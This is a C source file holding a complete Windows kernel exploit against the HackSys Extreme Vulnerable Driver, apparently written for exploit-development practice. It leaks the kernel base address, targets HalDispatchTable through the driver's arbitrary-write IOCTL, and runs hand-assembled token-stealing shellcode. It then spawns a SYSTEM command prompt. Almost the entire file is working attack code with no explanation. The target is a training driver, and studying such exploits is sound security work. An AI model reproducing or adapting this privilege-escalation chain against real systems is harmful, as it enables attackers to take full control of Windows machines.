#include <windows.h>
#include <stdio.h>


FARPROC WINAPI KernelSymbolInfo(LPCSTR lpSymbolName) 
{
	typedef enum _SYSTEM_INFORMATION_CLASS {
		SystemBasicInformation = 0,
		SystemPerformanceInformation = 2,
		SystemTimeOfDayInformation = 3,
		SystemProcessInformation = 5,
		SystemProcessorPerformanceInformation = 8,
		SystemModuleInformation = 11,
		SystemInterruptInformation = 23,
		SystemExceptionInformation = 33,
		SystemRegistryQuotaInformation = 37,
		SystemLookasideInformation = 45
	} SYSTEM_INFORMATION_CLASS;

	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION {
		ULONG NumberOfModules;
		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

	typedef NTSTATUS(NTAPI *_NtQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
		);

	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	LPVOID kernelBase = NULL;
	PUCHAR kernelImage = NULL;
	HMODULE hUserSpaceKernel;
	LPCSTR lpKernelName = NULL;
	FARPROC pUserKernelSymbol = NULL;
	FARPROC pLiveFunctionAddress = NULL;

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
	if (NtQuerySystemInformation == NULL) {
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo)
	{
		return NULL;
	}

	NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);

	kernelBase = ModuleInfo->Module[0].ImageBase;
	kernelImage = ModuleInfo->Module[0].FullPathName;

	wprintf(L"\n [+] Kernel Base Address is at: 0x%p \n", kernelBase);
	wprintf(L" [+] Kernel Full Image Name: %hs \n", kernelImage);

	/* Find exported Kernel Functions */

	lpKernelName = ModuleInfo->Module[0].FullPathName + ModuleInfo->Module[0].OffsetToFileName;

	hUserSpaceKernel = LoadLibraryExA(lpKernelName, 0, 0);
	if (hUserSpaceKernel == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	pUserKernelSymbol = GetProcAddress(hUserSpaceKernel, lpSymbolName);
	if (pUserKernelSymbol == NULL)
	{
		VirtualFree(ModuleInfo, 0, MEM_RELEASE);
		return NULL;
	}

	pLiveFunctionAddress = (FARPROC)((PUCHAR)pUserKernelSymbol - (PUCHAR)hUserSpaceKernel + (PUCHAR)kernelBase);

	FreeLibrary(hUserSpaceKernel);
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);

	return pLiveFunctionAddress;
}


int wmain(int argc, wchar_t* argv[])
{
	typedef NTSTATUS(NTAPI *_NtQueryIntervalProfile)(
		ULONG ProfileSource,
		PULONG Interval
		);

	_NtQueryIntervalProfile NtQueryIntervalProfile = (_NtQueryIntervalProfile)
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryIntervalProfile");
	if (NtQueryIntervalProfile == NULL) {
		return NULL;
	}
	
	LPVOID lpvPayload;
	HANDLE hDevice;
	LPVOID lpSourceTargetAddress = NULL;
	LPCWSTR lpDeviceName = L"\\\\.\\HacksysExtremeVulnerableDriver";
	BOOL bResult = FALSE;
	LPCSTR lpWriteTargetName = "HalDispatchTable";
	FARPROC fpWriteTarget = NULL;
	LPVOID lpWriteTargetAddress = NULL;
	PUCHAR chOverwriteBuffer;


	CHAR ShellCode[] = "\x60"		// pushad										; Save register state on the Stack
		"\x64\xA1\x24\x01\x00\x00"	// mov eax, fs:[KTHREAD_OFFSET]					; nt!_KPCR.PcrbData.CurrentThread
		"\x8B\x40\x50"				// mov eax, [eax + EPROCESS_OFFSET]				; nt!_KTHREAD.ApcState.Process
		"\x89\xC1"					// mov ecx, eax (Current _EPROCESS structure)	
		"\x8B\x98\xF8\x00\x00\x00"	// mov ebx, [eax + TOKEN_OFFSET]				; nt!_EPROCESS.Token
									//---[Copy System PID token]
		"\xBA\x04\x00\x00\x00"		// mov edx, 4 (SYSTEM PID)						; PID 4 -> System
		"\x8B\x80\xB8\x00\x00\x00"	// mov eax, [eax + FLINK_OFFSET] <-|			; nt!_EPROCESS.ActiveProcessLinks.Flink
		"\x2D\xB8\x00\x00\x00"		// sub eax, FLINK_OFFSET           |
		"\x39\x90\xB4\x00\x00\x00"	// cmp [eax + PID_OFFSET], edx     |			; nt!_EPROCESS.UniqueProcessId
		"\x75\xED"					// jnz                           ->|			; Loop !(PID=4)
		"\x8B\x90\xF8\x00\x00\x00"	// mov edx, [eax + TOKEN_OFFSET]				; System nt!_EPROCESS.Token
		"\x89\x91\xF8\x00\x00\x00"	// mov [ecx + TOKEN_OFFSET], edx				; Replace Current Process token
									//---[Recover]
		"\x61"						// popad										; Restore register state from the Stack
		"\xC3"						// ret 8										; Return
		;

	wprintf(L"    __ __         __    ____       	\n");
	wprintf(L"   / // /__ _____/ /__ / __/_ _____	\n");
	wprintf(L"  / _  / _ `/ __/  '_/_\\ \\/ // (_-<	\n");
	wprintf(L" /_//_/\\_,_/\\__/_/\\_\\/___/\\_, /___/	\n");
	wprintf(L"                         /___/     	\n");
	wprintf(L"					\n");
	wprintf(L"	 Extreme Vulnerable Driver  \n");
	wprintf(L"	    Arbitrary Overwrite \n\n");

	wprintf(L" [*] Allocating Ring0 Payload");

	lpvPayload = VirtualAlloc(
		NULL,						// Next page to commit
		sizeof(ShellCode),			// Page size, in bytes
		MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
		PAGE_EXECUTE_READWRITE);	// Read/write access
	if (lpvPayload == NULL)
	{
		wprintf(L" -> Unable to reserve Memory!\n\n");
		exit(1);
	}

	wprintf(L" -> Done!\n");

	memcpy(lpvPayload, ShellCode, sizeof(ShellCode));

	wprintf(L" [+] Ring0 Payload available at: 0x%p \n\n", lpvPayload);
	wprintf(L" [*] Create a double Pointer to our Payload!");

	lpSourceTargetAddress = (LPVOID)malloc(sizeof(LPVOID));
	lpSourceTargetAddress = &lpvPayload;

	wprintf(L" -> Done!\n");

	wprintf(L" [+] Source Pointer address for Overwrite in Kernelland is at: 0x%p \n\n", lpSourceTargetAddress);
	//wprintf(L" [+] Overwrite source Pointer contains: 0x%p \n\n", *(PULONG)lpSourceTargetAddress);

	wprintf(L" [*] Trying to get a handle to the following Driver: %ls", lpDeviceName);

	hDevice = CreateFile(lpDeviceName,					// Name of the write
		GENERIC_READ | GENERIC_WRITE,					// Open for reading/writing
		FILE_SHARE_WRITE,								// Allow Share
		NULL,											// Default security
		OPEN_EXISTING,									// Opens a file or device, only if it exists.
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,	// Normal file
		NULL);											// No attr. template

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		wprintf(L" -> Unable to get Driver handle!\n\n");
		exit(1);
	}

	wprintf(L" -> Done!\n");
	wprintf(L" [+] Our Device Handle: 0x%p \n\n", hDevice);

	wprintf(L" [*] Finding memory address of the %hs in Kernelland: ", lpWriteTargetName);

	fpWriteTarget = KernelSymbolInfo(lpWriteTargetName);
	if (fpWriteTarget == NULL)
	{
		wprintf(L" -> Unable to find memory address!\n\n");
		CloseHandle(hDevice);
		exit(1);
	}

	lpWriteTargetAddress = (LPVOID)((ULONG)fpWriteTarget + 0x4);
	wprintf(L" [+] %hs Address is at: 0x%p \n", lpWriteTargetName, (LPVOID)fpWriteTarget);
	wprintf(L" [+] Target address to Overwrite in Kernelland is at: 0x%p \n\n", lpWriteTargetAddress);

	wprintf(L" [*] Prepare our Arbitrary Overwrite Buffer");
	
	chOverwriteBuffer = (PUCHAR)malloc(sizeof(PUCHAR) * 2);
	memcpy(chOverwriteBuffer, &lpSourceTargetAddress, 4);
	memcpy(chOverwriteBuffer + 4, &lpWriteTargetAddress, 4);

	wprintf(L" -> Done!\n");
	wprintf(L" [+] Our Overwrite Buffer is available at: 0x%p \n\n", chOverwriteBuffer);

	wprintf(L" [*] Lets send our Arbitrary Buffer to the Driver and use NtQueryIntervalProfile to trigger Payload execution");

	DWORD junk = 0;                     // Discard results

	bResult = DeviceIoControl(hDevice,	// Device to be queried
		0x22200B,						// Operation to perform
		chOverwriteBuffer, 8,			// Input Buffer + 4 to trigger an exception in Kernel (Access violation)
		NULL, 0,						// Output Buffer
		&junk,							// # Bytes returned
		(LPOVERLAPPED)NULL);			// Synchronous I/O	
	if (!bResult) {
		wprintf(L" -> Failed to send Data!\n\n");
		CloseHandle(hDevice);
		exit(1);
	}

	//Trigger Payload Execution from Userland!
	NtQueryIntervalProfile(0xb03f, &junk);

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	wprintf(L" -> Done!\n\n");

	CloseHandle(hDevice);

}